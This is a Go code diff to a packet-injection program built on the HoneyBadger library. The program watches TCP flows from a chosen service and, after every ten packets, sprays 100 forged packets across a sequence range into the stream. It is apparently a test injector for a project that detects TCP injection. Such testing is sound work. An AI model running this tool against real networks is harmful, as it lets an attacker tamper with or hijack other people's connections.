@@ -25,7 +25,7 @@ import (
 	"code.google.com/p/gopacket/pcap"
 	"flag"
 	"fmt"
-	inject "github.com/david415/HoneyBadger"
+	"github.com/david415/HoneyBadger"
 	"log"
 	"net"
 )
@@ -34,6 +34,7 @@ var iface = flag.String("i", "lo", "Interface to get packets from")
 var filter = flag.String("f", "tcp", "BPF filter for pcap")
 var snaplen = flag.Int("s", 65536, "SnapLen for pcap packet capture")
 var serviceIPstr = flag.String("d", "127.0.0.1", "target TCP flows from this IP address")
+var servicePort = flag.Int("e", 9666, "target TCP flows from this port")
 
 func main() {
 	defer util.Run()()
@@ -47,6 +48,8 @@ func main() {
 	var payload gopacket.Payload
 	decoded := make([]gopacket.LayerType, 0, 4)
 
+	// target/track all TCP flows from this TCP/IP service endpoint
+	trackedFlows := make(map[HoneyBadger.TcpIpFlow]int)
 	serviceIP := net.ParseIP(*serviceIPstr)
 	if serviceIP == nil {
 		panic(fmt.Sprintf("non-ip target: %q\n", serviceIPstr))
@@ -56,7 +59,7 @@ func main() {
 		panic(fmt.Sprintf("non-ipv4 target: %q\n", serviceIPstr))
 	}
 
-	streamInjector := inject.TCPStreamInjector{}
+	streamInjector := HoneyBadger.TCPStreamInjector{}
 	err := streamInjector.Init("0.0.0.0")
 	if err != nil {
 		panic(err)
@@ -72,27 +75,48 @@ func main() {
 	}
 	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet,
 		&eth, &dot1q, &ip4, &ip6, &ip6extensions, &tcp, &payload)
+	flow := HoneyBadger.TcpIpFlow{}
 
 	log.Print("collecting packets...\n")
 
-	data, ci, err := handle.ZeroCopyReadPacketData()
-	if err != nil {
-		log.Printf("error getting packet: %v %s", err, ci)
-		return
+	for {
+		data, ci, err := handle.ZeroCopyReadPacketData()
+		if err != nil {
+			log.Printf("error getting packet: %v %s", err, ci)
+			continue
+		}
+		err = parser.DecodeLayers(data, &decoded)
+		if err != nil {
+			log.Printf("error decoding packet: %v", err)
+			continue
+		}
+
+		// if we see a flow coming from the tcp/ip service we are watching
+		// then track how many packets we receive from each flow
+		if tcp.SrcPort == layers.TCPPort(*servicePort) && ip4.SrcIP.Equal(serviceIP) {
+			flow = HoneyBadger.NewTcpIpFlowFromLayers(ip4, tcp)
+			_, isTracked := trackedFlows[flow]
+			if isTracked {
+				trackedFlows[flow] += 1
+			} else {
+				trackedFlows[flow] = 1
+			}
+		} else {
+			continue
+		}
+
+		// after 10 packets from a given flow then inject packets into the stream
+		if trackedFlows[flow]%10 == 0 {
+			err = streamInjector.SetIPLayer(ip4)
+			if err != nil {
+				panic(err)
+			}
+			streamInjector.SetTCPLayer(tcp)
+			err = streamInjector.SpraySequenceRangePackets(tcp.Seq, 100)
+			if err != nil {
+				panic(err)
+			}
+			log.Print("packet spray sent!\n")
+		}
 	}
-	err = parser.DecodeLayers(data, &decoded)
-	if err != nil {
-		log.Printf("error decoding packet: %v", err)
-		return
-	}
-	err = streamInjector.SetIPLayer(ip4)
-	if err != nil {
-		panic(err)
-	}
-	streamInjector.SetTCPLayer(tcp)
-	err = streamInjector.SpraySequenceRangePackets(tcp.Seq, 3)
-	if err != nil {
-		panic(err)
-	}
-	log.Print("packet spray sent!\n")
 }
